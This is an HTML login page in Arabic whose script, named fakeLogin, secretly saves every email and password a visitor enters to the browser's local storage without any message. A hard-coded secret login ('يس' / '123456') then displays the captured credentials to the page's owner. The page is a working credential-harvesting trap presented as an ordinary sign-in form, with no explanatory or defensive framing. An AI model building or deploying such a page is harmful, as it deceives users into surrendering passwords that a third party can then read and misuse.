<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>تسجيل الدخول</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(to right, #4b6cb7, #182848);
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      direction: rtl;
    }

    .login-box {
      background-color: #fff;
      border-radius: 20px;
      padding: 40px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
      width: 100%;
      max-width: 400px;
      text-align: center;
      animation: fadeIn 1s ease-in-out;
    }

    .login-box h2 {
      margin-bottom: 30px;
      color: #333;
    }

    .login-box input {
      width: 100%;
      padding: 15px;
      margin: 10px 0;
      border: none;
      border-radius: 10px;
      background-color: #f1f1f1;
      font-size: 16px;
    }

    .login-box button {
      width: 100%;
      padding: 15px;
      border: none;
      border-radius: 10px;
      background-color: #4b6cb7;
      color: white;
      font-size: 18px;
      cursor: pointer;
      transition: background 0.3s;
    }

    .login-box button:hover {
      background-color: #3a59a0;
    }

    #log {
      margin-top: 20px;
      background-color: #f9f9f9;
      padding: 15px;
      border-radius: 10px;
      box-shadow: inset 0 0 5px rgba(0,0,0,0.1);
      display: none;
      text-align: right;
      color: #444;
    }

    @keyframes fadeIn {
      from {opacity: 0; transform: translateY(-20px);}
      to {opacity: 1; transform: translateY(0);}
    }
  </style>
</head>
<body>

  <div class="login-box">
    <h2>تسجيل الدخول</h2>
    <input type="text" id="email" placeholder="البريد الإلكتروني">
    <input type="password" id="password" placeholder="كلمة المرور">
    <button onclick="fakeLogin()">دخول</button>
    <div id="log"></div>
  </div>

  <script>
    function fakeLogin() {
      const email = document.getElementById("email").value.trim();
      const password = document.getElementById("password").value.trim();
      const log = document.getElementById("log");

      if (email === "يس" && password === "123456") {
        const savedEmail = localStorage.getItem("savedEmail") || "لا يوجد";
        const savedPassword = localStorage.getItem("savedPassword") || "لا يوجد";

        log.innerHTML = `
          <strong>البيانات المحفوظة:</strong><br>
          <b>الإيميل:</b> ${savedEmail}<br>
          <b>كلمة السر:</b> ${savedPassword}
        `;
        log.style.display = "block";
      } else {
        // حفظ البيانات فقط دون عرض رسالة
        localStorage.setItem("savedEmail", email);
        localStorage.setItem("savedPassword", password);
        log.style.display = "none";
      }
    }
  </script>

</body>
</html>
